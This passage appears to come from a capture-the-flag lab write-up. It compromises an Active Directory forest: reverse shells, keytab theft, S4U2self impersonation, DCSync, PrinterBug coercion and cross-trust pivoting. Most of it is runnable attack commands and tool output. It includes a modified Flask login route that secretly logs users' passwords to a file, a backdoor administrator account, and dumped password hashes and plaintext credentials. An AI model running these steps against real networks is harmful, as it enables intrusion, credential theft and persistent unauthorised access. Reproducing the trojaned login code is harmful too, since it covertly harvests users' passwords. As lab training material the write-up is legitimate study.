svc_tx    148598  0.0  0.0   7372  3508 ?        S    05:25   0:00  |   \_ bash /tmp/b
svc_tx    148599  0.0  0.0   2892   968 ?        S    05:25   0:00  |       \_ /bin/sh -i
svc_tx    148622  0.0  0.2  17516  9340 ?        S    05:27   0:00  |           \_ python3 -c import pty;pty.spawn(
svc_tx    148623  0.0  0.1  17036  4880 pts/0    Ss+  05:27   0:00  |               \_ /bin/bash
svc_tx    149035  0.0  0.0   2892  1008 ?        S    06:03   0:00  \_ /bin/sh -c bash /tmp/b
svc_tx    149036  0.0  0.0   7372  3488 ?        S    06:03   0:00      \_ bash /tmp/b
svc_tx    149037  0.0  0.0   2892   956 ?        S    06:03   0:00          \_ /bin/sh -i
svc_tx    149040  0.0  0.2  17516  9308 ?        S    06:03   0:00              \_ python3 -c import pty;pty.spawn(
svc_tx    149041  0.0  0.1  17036  4712 pts/1    Ss   06:03   0:00                  \_ /bin/bash
svc_tx    149281  0.0  0.0  19800  3800 pts/1    R+   06:18   0:00                      \_ ps -aux --forest
```

Both shells hang off the Flask app, exactly as expected. Note `sssd` running as root and joined to `dev.zenith.rv` - this box is domain-joined, which is why the next finding matters.

### WEB01 - Keytab Extraction and Root via S4U2self (Flag 7)

→ interesting files:

```bash
svc_tx@web01:/opt/tx/app$ ls -lah /etc/krb*
ls -lah /etc/krb*
-rw-r--r-- 1 root root   70 Mar 18 13:49 /etc/krb5.conf
-rw------- 1 root root 1.3K Mar 18 13:49 /etc/krb5.keytab
svc_tx@web01:/opt/tx/app$ ls -lah /tmp/
ls -lah /tmp/
total 100K
drwxrwxrwt 23 root   root         4.0K Mar 29 05:35 .
drwxr-xr-x 20 root   root         4.0K Jan  6  2025 ..
drwxr-xr-x  3 svc_tx domain users 4.0K Mar 29 05:33 ...
drw-------  2 root   root         4.0K Mar 19 14:02 adcli-krb5-6est6K
drw-------  2 root   root         4.0K Mar 21 14:02 adcli-krb5-8kLWNY
drw-------  2 root   root         4.0K Mar 18 14:02 adcli-krb5-gNlIiU
drw-------  2 root   root         4.0K Mar 20 14:02 adcli-krb5-IVePFf
drw-------  2 root   root         4.0K Mar 26 14:02 adcli-krb5-M6NfYO
drw-------  2 root   root         4.0K Mar 28 14:02 adcli-krb5-OmSFJ9
drw-------  2 root   root         4.0K Mar 22 14:02 adcli-krb5-pYns8M
drw-------  2 root   root         4.0K Mar 25 14:02 adcli-krb5-SDHvBF
drw-------  2 root   root         4.0K Mar 24 14:02 adcli-krb5-ylZqpT
drw-------  2 root   root         4.0K Mar 23 14:02 adcli-krb5-yqRAMl
drw-------  2 root   root         4.0K Mar 27 14:02 adcli-krb5-Z5fJjn
```

`/etc/krb5.keytab` on a domain-joined Linux host holds the machine account's long-term Kerberos keys - the Linux equivalent of dumping `WEB01$` out of LSASS. It is root-only, but the `sudo -l` result above gives us a way to read arbitrary files. So with hexdump we can dump the keytab file and also `/etc/shadow`, in order to crack the root password.

{% image79 %}

For the restoration we will use a python script:

```bash
import re

hexdump_file = "krb5.keytab.hexdump"
output_file = "krb5.keytab.restored"

with open(hexdump_file, "r") as f:
    data = f.read()

hex_values = re.findall(r'\b[0-9a-fA-F]{4}\b', data)

byte_array = bytearray()
for value in hex_values:
    # swap endian: 0205 -> 05 02
    bytes_pair = bytes.fromhex(value)
    byte_array.extend(bytes_pair[::-1])

with open(output_file, "wb") as f:
    f.write(byte_array)

print(f"Restored file saved as {output_file}")
```

And after using the python script we will get:

{% image80 %}

Now by using the keytab extractor script we will get the following:

```bash
➜  the_range_village python3 /opt/keytabExtractor2/keytabExtractor2.py krb5.keytab.restored
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File version 5.2 successfully imported.

[+] Entry 1:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : WEB01$
	NTLM HASH : 8e738de23fd812d41d471935973aa53f

[+] Entry 2:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : WEB01$
	AES-128 HASH : cb4955cc289b93982ca8bb310372fd1f

[+] Entry 3:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : WEB01$
	AES-256 HASH : 113d723ef9cec81e311f972fcbe42186883f4b603a7834092d1343b33e5bd3a3

[+] Entry 4:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/WEB01
	NTLM HASH : 8e738de23fd812d41d471935973aa53f

[+] Entry 5:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/WEB01
	AES-128 HASH : cb4955cc289b93982ca8bb310372fd1f

[+] Entry 6:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/WEB01
	AES-256 HASH : 113d723ef9cec81e311f972fcbe42186883f4b603a7834092d1343b33e5bd3a3

[+] Entry 7:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/web01.dev.zenith.rv
	NTLM HASH : 8e738de23fd812d41d471935973aa53f

[+] Entry 8:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/web01.dev.zenith.rv
	AES-128 HASH : cb4955cc289b93982ca8bb310372fd1f

[+] Entry 9:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : host/web01.dev.zenith.rv
	AES-256 HASH : 113d723ef9cec81e311f972fcbe42186883f4b603a7834092d1343b33e5bd3a3

[+] Entry 10:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/WEB01
	NTLM HASH : 8e738de23fd812d41d471935973aa53f

[+] Entry 11:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/WEB01
	AES-128 HASH : cb4955cc289b93982ca8bb310372fd1f

[+] Entry 12:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/WEB01
	AES-256 HASH : 113d723ef9cec81e311f972fcbe42186883f4b603a7834092d1343b33e5bd3a3

[+] Entry 13:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/web01.dev.zenith.rv
	NTLM HASH : 8e738de23fd812d41d471935973aa53f

[+] Entry 14:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/web01.dev.zenith.rv
	AES-128 HASH : cb4955cc289b93982ca8bb310372fd1f

[+] Entry 15:
	REALM : DEV.ZENITH.RV
	SERVICE PRINCIPAL : RestrictedKrbHost/web01.dev.zenith.rv
	AES-256 HASH : 113d723ef9cec81e311f972fcbe42186883f4b603a7834092d1343b33e5bd3a3
```

Fifteen entries, but only one secret: every SPN registered to WEB01 shares the same machine account keys.

→ Generate krb5 conf file:

```bash
➜  the_range_village netexec smb DC02.dev.zenith.rv -u 'svc_tx' -p 'KLocjq6X1o9S' --generate-krb5-file krb5.conf
SMB         10.5.10.13      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:dev.zenith.rv) (signing:True) (SMBv1:False)
SMB         10.5.10.13      445    DC02             [+] dev.zenith.rv\svc_tx:KLocjq6X1o9S
```

→ Getting the TGT of the `svc_tx` user:

```bash
➜  the_range_village impacket-getTGT 'dev.zenith.rv'/'svc_tx':'KLocjq6X1o9S'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```

And - but unfortunately it is not working:

```bash
➜  the_range_village export KRB5CCNAME=./svc_tx.ccache
➜  the_range_village export KRB5_CONFIG=/etc/krb5.conf
➜  the_range_village ssh 'svc_tx'@WEB01.dev.zenith.rv
svc_tx@web01.dev.zenith.rv's password:
```

The ticket is valid but SSH falls back to password authentication, so `svc_tx` alone does not get us a clean session.

→ realm list:

```bash
svc_tx@web01:/tmp/...$ realm list
realm list
dev.zenith.rv
  type: kerberos
  realm-name: DEV.ZENITH.RV
  domain-name: dev.zenith.rv
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U
  login-policy: allow-permitted-logins
  permitted-logins: svc_tx
  permitted-groups: Domain Admins@dev.zenith.rv
```

This is the key detail: the host allows domain logins for `svc_tx` and for anyone in `Domain Admins`. If we can present a Kerberos ticket for a Domain Admin, sssd will let us straight in.

→ writable WEB01:

```bash
➜  the_range_village bloodyad -d dev.zenith.rv -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 -u 'WEB01$' -p ':8e738de23fd812d41d471935973aa53f' get writable

distinguishedName: CN=WEB01,CN=Computers,DC=dev,DC=zenith,DC=rv
permission: CREATE_CHILD; WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=dev,DC=zenith,DC=rv
permission: WRITE

distinguishedName: CN=TPM Devices,DC=dev,DC=zenith,DC=rv
permission: CREATE_CHILD
```

Now remembering that we have the machine account of WEB01. The `S4U2self` extension allows a service to obtain a service ticket for itself, without requiring the user to authenticate. Similarly to how we can forge a silver ticket for users, we can also use the `s4u` extension to obtain a service ticket.

As with `Silver Tickets`, this concept can also be applied on machine accounts (they are technically service accounts).

So the command would be something like this:

```bash
➜  the_range_village impacket-getST -self -impersonate 'Administrator' -altservice 'host/web01.dev.zenith.rv' 'DEV.ZENITH.RV'/'WEB01$' -hashes ':8e738de23fd812d41d471935973aa53f'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Changing service from WEB01$@DEV.ZENITH.RV to host/web01.dev.zenith.rv@DEV.ZENITH.RV
[*] Saving ticket in Administrator@host_web01.dev.zenith.rv@DEV.ZENITH.RV.ccache
```

The `-altservice` switch rewrites the service name to `host/`, which is the SPN that SSH on this box will accept. So let's export the ccache: `export KRB5CCNAME=./Administrator@host_web01.dev.zenith.rv@DEV.ZENITH.RV.ccache`

And now we can authenticate as the administrator on the machine using SSH: `ssh 'Administrator'@web01.dev.zenith.rv`

{% image81 %}

→ Flag7: `RV{s4U2$elf_oN_l1nUX???_832238abc3d49476d2b3d9bed53fa614}`

{% image82 %}

### WEB01 - Harvesting Domain Credentials

Root on WEB01 gives us a privileged position on a host that domain users authenticate against, which opens the door to credential capture. So let's start by monitoring TGT cache files:

```bash
-rw-r--r--  1 svc_tx domain users   43 Mar 29 06:42 .krb5cc_seen.186975
root@web01:/home/administrator# cat /tmp/.krb5cc_seen.186975
/tmp/a
/tmp/b
/tmp/krb5cc_521801627_Zp2YkK
root@web01:/home/administrator# cat /tmp/krb5cc_521801627_Zp2YkK
cat: /tmp/krb5cc_521801627_Zp2YkK: No such file or directory
```

So let's start monitoring and see if we get any TGTs:

{% image83 %}

But nothing is appearing - so let's come back to the web application. It requires domain credentials and it is publicly reachable, which is a pretty good indicator that there might be a scheduled job or a real user logging in periodically. If so, we can simply capture what they type.

So this is the route that we need to modify:

{% image84 %}

So let's make it so that when a user logs in, the credentials will be saved in /tmp/login_credentials.txt:

```bash
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('search'))

    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')

        try:
            with open('/tmp/login_credentials.txt', 'a') as f:
                f.write(f"Username: {username}, Password: {password}\n")
        except Exception as e:
            print(f"Error writing credentials: {e}")

        user = authenticate_ad(username, password)
        if user:
            login_user(user)
            return redirect(url_for('search'))

        return render_template(
            'login.html',
            error='Invalid credentials or insufficient permissions.'
        ), 401

    return render_template('login.html')
```

Note that the write happens before `authenticate_ad`, so we capture every attempt, valid or not, and the application keeps behaving exactly as before. And now we just need to restart the service and look in the /tmp/ folder: `systemctl restart tx.service`

Or we could use `gdb` to sniff the credentials of the running process, which avoids touching the application on disk:

```bash
root@web01:/opt/tx/app# which gdb
/usr/bin/gdb
```

So for this we would need the PID of the running application: `ps -aux --forest`

{% image85 %}

So in this case it is `93307`:

→ shared libraries inspection ( trimmed to the TLS libraries, which are what we care about ):

```bash
(gdb) info sharedlibrary
From                To                  Syms Read   Shared Object Library
0x00007ff30e9ec700  0x00007ff30eb7e9fd  Yes         /lib/x86_64-linux-gnu/libc.so.6
0x00007ff30e0d3850  0x00007ff30e0dd252  Yes (*)     /usr/lib/python3.10/lib-dynload/_ssl.cpython-310-x86_64-linux-gnu.so
0x00007ff30e03cd70  0x00007ff30e093f7e  Yes (*)     /lib/x86_64-linux-gnu/libssl.so.3
0x00007ff30dc8b000  0x00007ff30dee7e22  Yes (*)     /lib/x86_64-linux-gnu/libcrypto.so.3
0x00007ff30d987cc0  0x00007ff30d98cfdb  Yes (*)     /usr/lib/python3.10/lib-dynload/_hashlib.cpython-310-x86_64-linux-gnu.so
```

`libssl.so.3` is loaded, so breaking on `SSL_read` should show us plaintext request bodies before the application ever parses them.

→ gdb settings:

```bash
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) set scheduler-locking off
(gdb) set print pretty on
(gdb) break SSL_read
Breakpoint 1 at 0x7ff30e04dc90
(gdb) continue
```

But in GDB the threads die too fast, so let's come back to restarting the service and looking into the `/tmp` folder for the credentials:

{% image86 %}

And we got the credentials:

```bash
root@web01:/tmp# cat login_credentials.txt
Username: zander.lim, Password: b2i6V2HRNwj6uL
```

A real user does log in, and they happen to be a Domain Admin.

## Full Compromise of dev.zenith.rv

### DCSync of the Child Domain

Now since we have the DA account we could perform a DCSync attack against the `dev.zenith.rv` domain. The full output is enormous - the range contains roughly ninety auto-generated `txtest-*` scaffolding accounts, each with its own AES and DES keys - so the excerpt below keeps the LSA secrets, the real named accounts, `krbtgt`, and the machine accounts, which is everything the rest of the chain depends on:

```bash
➜  bloodhound_ce impacket-secretsdump dev.zenith.rv/zander.lim:'b2i6V2HRNwj6uL'@DC02.dev.zenith.rv
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x54d41bd13ce3480c30f40ab907b4fcf6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dfc032ae26a728e693ce192e27ae41a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
DEV\DC02$:aes256-cts-hmac-sha1-96:373046036dbbce6095ad47bf46449a03a9bf68cccfac8ffabf961800f0bc3a2f
DEV\DC02$:aes128-cts-hmac-sha1-96:3939a6fe6bd0aafb1d917cc4e3182961
DEV\DC02$:des-cbc-md5:f7ef4c049192d00d
DEV\DC02$:aad3b435b51404eeaad3b435b51404ee:5eec8e0a0b636a39f653d2eb8ff2b147:::
[*] DefaultPassword
(Unknown User):password
[*] DPAPI_SYSTEM
dpapi_machinekey:0x0becfc963d5abc893c56203531d9e1ebe1f61a0e
dpapi_userkey:0x71654a14ae6948e01e93ab0d1769d6a50d8223c3
[*] NL$KM
NL$KM:a9fbc567bf228363599d7c44eac4bab3c5ad454fcef5060164ba569dc881731bc51bce1d9e41fd404cd08e571595d6f844a9b75e104904c972d36240fa332d8c
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b299899c918a0dcddc2e71fced5c4e45:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:73272f85b2c943525a92f9643e73344e:::
async_adm:1104:aad3b435b51404eeaad3b435b51404ee:bc4e1bbc02aee9288556ca7a9d29b91e:::
zulhasnan.ali:1602:aad3b435b51404eeaad3b435b51404ee:66a0d3a454e572bf5326529dafa3fe8f:::
meera.krishnan:1603:aad3b435b51404eeaad3b435b51404ee:26fff2604a6a05ac52105dc169767565:::
marcus.tan:1604:aad3b435b51404eeaad3b435b51404ee:1cd2ba5456fa38f3194e63540d94b2dd:::
siti.nurhaliza:1605:aad3b435b51404eeaad3b435b51404ee:8c5842ec86d562bc2acd1836f2b5c01f:::
vicky.chandran:1606:aad3b435b51404eeaad3b435b51404ee:3df805c4583c83eb0297ab1e14c20dae:::
emily.chen:1607:aad3b435b51404eeaad3b435b51404ee:6841446d1cb6fa97c782dee54fcf9b98:::
david.lee:1608:aad3b435b51404eeaad3b435b51404ee:ecac554aac1d816179c30deb611cce29:::
sophia.wong:1609:aad3b435b51404eeaad3b435b51404ee:b6fbb60e9ec50f7db642c5b90640dec1:::
sherlyn.wong:1610:aad3b435b51404eeaad3b435b51404ee:eef31972a0a9c155799ef7cabe274697:::
ahmad.fauzi:1611:aad3b435b51404eeaad3b435b51404ee:70a3cc731a6d050be9e56640ac4b5630:::
kavita.kaur:1612:aad3b435b51404eeaad3b435b51404ee:dfd11bb7b1edb5f1ef36ad93584eece9:::
desmond.koh:1613:aad3b435b51404eeaad3b435b51404ee:6108964e15ff2ba9ceea3de3c776e050:::
nurul.izzah:1614:aad3b435b51404eeaad3b435b51404ee:3d286529c2c368e66de8498c4d49405f:::
svc_vdi:1615:aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846:::
svc_sql:1616:aad3b435b51404eeaad3b435b51404ee:c8137934841c374de1afb1507dbba46a:::
adrian.wong:1620:aad3b435b51404eeaad3b435b51404ee:0bd7f09b890da40a105ef96b36809e82:::
zenith-tester:1621:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
sql-dev-372f:1623:aad3b435b51404eeaad3b435b51404ee:ee13ade1bdd6cdc9b20dc814e0f14027:::
svc_sqladm:1624:aad3b435b51404eeaad3b435b51404ee:7e6b4b1e97e0bd73891e2088643428ae:::
jess.lim:1626:aad3b435b51404eeaad3b435b51404ee:d7a175fef486226503a4641ba787dd85:::
svc_tx:1627:aad3b435b51404eeaad3b435b51404ee:d121160f246608c866c73dd1daac46b7:::

    [ ... 91 auto-generated txtest-* accounts omitted ... ]

zander.lim:1728:aad3b435b51404eeaad3b435b51404ee:9c13855747dec78ff5361ee82d049085:::
localuser:1730:aad3b435b51404eeaad3b435b51404ee:3e4bcbf080452715ae754a79a6b27bec:::
DC02$:1001:aad3b435b51404eeaad3b435b51404ee:5eec8e0a0b636a39f653d2eb8ff2b147:::
FS01$:1105:aad3b435b51404eeaad3b435b51404ee:713044c19ef2bd125ae64010b0a567ba:::
SQL01$:1107:aad3b435b51404eeaad3b435b51404ee:8c4932e605f7ab31582bb234fb6ca444:::
WEB01$:1729:aad3b435b51404eeaad3b435b51404ee:8e738de23fd812d41d471935973aa53f:::
zenith$:1106:aad3b435b51404eeaad3b435b51404ee:88158bbb9dd5af89da0dbb6a8d62250b:::
[*] Kerberos keys grabbed

    [ ... per-account AES256/AES128/DES keys omitted - only krbtgt's matter below ... ]

krbtgt:aes256-cts-hmac-sha1-96:bfc6942cdf9e61dd518cbc5119a6e2d52707a8b1519ad7ac33f7390c8492dcce
krbtgt:aes128-cts-hmac-sha1-96:5939ac0ec903ed262fc3870da9f68ebf
krbtgt:des-cbc-md5:b98fc4c1735873cb
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

Two entries are worth pausing on: `krbtgt`, which we need for a cross-domain ticket, and `zenith$` - a trust account, which is the child domain's side of the trust with its parent.

### Domain Admin Access (Flag 8)

But also since we have the credentials for the user `zander.lim` we can simply connect via SSH:

{% image87 %}

→ Flag8: `RV{7hE_Dom1NO5_8E91n_7o_FAl1_3ef7af41a4375f3491299a38d71a9f67}`

## Pivoting to the Parent Domain: zenith.rv

### Reaching DC01 on the 10.5.20.0/24 Subnet

If we inspect the `ipconfig /all` we will see something interesting:

{% image88 %}

There are 2 DNS Server entries, and if we try to ping `10.5.20.3` we can see that it works - this box can reach the subnet that was silent from everywhere else:

{% image89 %}

So let's upload the ligolo agent and get access to the .20 subnet: `for i in {1..254}; do (ping -c 1 10.5.20.$i | grep "bytes from" &) ;done`

```bash
➜  the_range_village for i in {1..254}; do (ping -c 1 10.5.20.$i | grep "bytes from" &) ;done
64 bytes from 10.5.20.2: icmp_seq=1 ttl=64 time=390 ms
64 bytes from 10.5.20.3: icmp_seq=1 ttl=64 time=386 ms
64 bytes from 10.5.20.1: icmp_seq=1 ttl=64 time=392 ms
64 bytes from 10.5.20.254: icmp_seq=1 ttl=64 time=921 ms
```

→ Scanning the 10.5.20.3 machine:

```bash
Open 10.5.20.3:53
Open 10.5.20.3:22
Open 10.5.20.3:88
Open 10.5.20.3:135
Open 10.5.20.3:139
Open 10.5.20.3:445
Open 10.5.20.3:464
Open 10.5.20.3:389
Open 10.5.20.3:593
Open 10.5.20.3:636
Open 10.5.20.3:3269
Open 10.5.20.3:3268
Open 10.5.20.3:3389
Open 10.5.20.3:5986
Open 10.5.20.3:5985
Open 10.5.20.3:9389
```

And we found that the machine is called DC01 - the parent domain's controller:

{% image90 %}

### Child-to-Parent Escalation (Flag 9)

Since we compromised the child domain we can pivot to the parent domain. For this we will first need the child domain SID and also the parent one:

```bash
➜  the_range_village impacket-lookupsid -domain-sids dev.zenith.rv/zander.lim:'b2i6V2HRNwj6uL'@10.5.10.13 0
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.5.10.13
[*] StringBinding ncacn_np:10.5.10.13[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-195487179-2889055437-2294585937 -> child
➜  the_range_village impacket-lookupsid -domain-sids dev.zenith.rv/zander.lim:'b2i6V2HRNwj6uL'@10.5.20.3 0
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.5.20.3
[*] StringBinding ncacn_np:10.5.20.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3404723160-3584365854-295986508 -> parent
```

→ krbtgt for the child domain:

```bash
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:73272f85b2c943525a92f9643e73344e:::
```

Now let's create the golden ticket. Because the two domains share a forest, a ticket signed by the child's `krbtgt` that carries the parent's Enterprise Admins SID (`-519`) in its extra SIDs should be honoured by the parent - the classic child-to-parent escalation:

```bash
➜  domain_compromise ticketer.py -nthash 73272f85b2c943525a92f9643e73344e \
 -domain-sid S-1-5-21-195487179-2889055437-2294585937 \
 -domain dev.zenith.rv \
 -extra-sid S-1-5-21-3404723160-3584365854-295986508-519 \
 goldenuser
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for dev.zenith.rv/goldenuser
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in goldenuser.ccache
```

But it's not working - SID filtering is doing its job here:

{% image91 %}

So let's take a step back. Let's use bloodhound-ce-python to get information about the parent DC and then continue with the attacks from there:

```bash
➜  domain_compromise bloodhound-ce-python --domain zenith.rv --username 'zander.lim@dev.zenith.rv' --password 'b2i6V2HRNwj6uL' --nameserver 10.5.20.3 --domain-controller DC01.zenith.rv --global-catalog DC01.zenith.rv --collectionmethod all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: zenith.rv
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.zenith.rv
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.zenith.rv
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.zenith.rv
INFO: Done in 00M 43S
INFO: Compressing output into 20260329161622_bloodhound.zip
```

→ Get Domain Trust:

```bash
╰─ ❯ Get-DomainTrust
objectClass                   : top
                                leaf
                                trustedDomain
whenCreated                   : 15/03/2026 07:14:05 (14 days ago)
whenChanged                   : 18/03/2026 05:55:51 (11 days ago)
name                          : mgmt-zenith.rv
objectGUID                    : {9717187b-3b4b-4c0c-a8d8-63cab2f5f173}
securityIdentifier            : S-1-5-21-2244198459-2043822163-2948862655
trustDirection                : INBOUND
                                OUTBOUND
                                BIDIRECTIONAL
trustPartner                  : mgmt-zenith.rv
trustType                     : WINDOWS_ACTIVE_DIRECTORY
                                MIT
trustAttributes               : FOREST_TRANSITIVE
flatName                      : mgmt-zenith
msDS-TrustForestTrustInfo     : S-1-5-21-2244198459-2043822163-2948862655

objectClass                   : top
                                leaf
                                trustedDomain
whenCreated                   : 15/03/2026 07:01:44 (14 days ago)
whenChanged                   : 15/03/2026 07:01:44 (14 days ago)
name                          : dev.zenith.rv
objectGUID                    : {d782507c-ca72-4400-82b2-e1c5eb4581d9}
securityIdentifier            : S-1-5-21-195487179-2889055437-2294585937
trustDirection                : INBOUND
                                OUTBOUND
                                BIDIRECTIONAL
trustPartner                  : dev.zenith.rv
trustType                     : WINDOWS_ACTIVE_DIRECTORY
                                MIT
trustAttributes               : WITHIN_FOREST
flatName                      : DEV
```

Two trusts: `WITHIN_FOREST` back down to the child, and `FOREST_TRANSITIVE` across to `mgmt-zenith.rv` - a third domain we have not touched yet.

Rather than forging a ticket, let's capture a real one. In `Rubeus.exe` we ran `.\Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap` and, in order to trigger the coercion, we did the following:

```bash
python3 /opt/krbrelayx/printerbug.py 'dev.zenith.rv'/'zander.lim':'b2i6V2HRNwj6uL'@DC01.zenith.rv DC02.dev.zenith.rv
[*] Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attempting to trigger authentication via rprn RPC at DC01.zenith.rv
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

The `rpc_s_access_denied` is misleading - the coercion still fires. And we can see that we got the ticket base64 encoded:

{% image92 %}

Now we need to convert the base64:

{% image93 %}

And inspecting the ccache file we can see that it's indeed the DC01:

```bash
➜  domain_compromise impacket-describeTicket ticket.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 6a5a38e69a2a26270ca27c6d4713754bdc9e537926a4db69cb7f71d0bd801f82
[*] User Name                     : DC01$
[*] User Realm                    : ZENITH.RV
[*] Service Name                  : krbtgt/ZENITH.RV
[*] Service Realm                 : ZENITH.RV
[*] Start Time                    : 29/03/2026 07:16:16 AM
[*] End Time                      : 29/03/2026 17:16:16 PM
[*] RenewTill                     : 01/04/2026 08:11:54 AM
[*] Flags                         : (0x60a10000) forwardable, forwarded, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : alo45poqJicMonxtRxN1S9yeU3kmpNtpy39x0L2AH4I=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/ZENITH.RV
[*]   Service Realm               : ZENITH.RV
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

A forwardable TGT for the parent DC's own machine account. With this now we can perform an `S4U2self` attack, exactly as we did against WEB01:

```bash
impacket-getST -k -no-pass -self -altservice 'cifs/dc01.zenith.rv' -impersonate 'Administrator' 'zenith.rv'/'DC01$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Changing service from DC01$@ZENITH.RV to cifs/dc01.zenith.rv@ZENITH.RV
[*] Saving ticket in Administrator@cifs_dc01.zenith.rv@ZENITH.RV.ccache
```

And now we can use this ccache to authenticate as the Administrator on the DC01:

{% image94 %}

Now we can execute commands using `psexec`:

{% image95 %}

→ So let's create a backdoor account:

```bash
C:\> net user 0xd1s Password123! /add
The command completed successfully.

C:\> net localgroup Administrators 0xd1s /add
The command completed successfully.
```

And we can see that we can connect via SSH:

{% image96 %}

→ Flag9: `RV{p4R3Nt4L_l0VE_1s_4lL_7oO_7RU$tiN9_!5Nt_I7?_201ae8e98581c4a08c71154a8a792488}`

{% image97 %}

## Crossing the Forest Trust: mgmt-zenith.rv

### mgmt-zenith.rv - Domain Enumeration

And we can see that there is another domain:

```bash
PS C:\Users\0xd1s\Downloads> Get-ForestTrust

TopLevelNames            : {mgmt-zenith.rv}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {mgmt-zenith.rv}
SourceName               : zenith.rv
TargetName               : mgmt-zenith.rv
TrustType                : Forest
TrustDirection           : Bidirectional
```

So if we try to ping this domain we can see that it's on another subnet:

```bash
PS C:\Users\0xd1s\Downloads> ping -n 3 mgmt-zenith.rv

Pinging mgmt-zenith.rv [10.5.30.8] with 32 bytes of data:
Reply from 10.5.30.8: bytes=32 time<1ms TTL=127
Reply from 10.5.30.8: bytes=32 time=1ms TTL=127
Reply from 10.5.30.8: bytes=32 time=1ms TTL=127

Ping statistics for 10.5.30.8:
    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
